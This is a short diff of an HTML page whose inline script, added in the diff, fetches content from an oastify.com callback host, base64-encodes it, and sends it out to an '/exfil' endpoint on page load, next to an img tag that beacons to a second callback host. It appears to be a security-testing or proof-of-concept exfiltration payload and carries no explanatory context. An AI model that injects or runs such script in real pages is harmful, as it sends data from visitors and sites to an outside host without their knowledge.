@@ -3,11 +3,12 @@
 <img src="http://vutkcbjvck26lx9ibcyfpqj8hznqbiz7.oastify.com/check.png">
 <script>
 (async () => {
-var BASE = 'https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com';
-var COLLAB = 'https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com';
 
-window.fetch("https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/h");
+const res = await window.fetch("https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/h");
+const text = await res.text();
+const encoded = btoa(text);
 
+await window.fetch(`https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/exfil?d=${encoded}`);
 })();
 </script>
 </html>
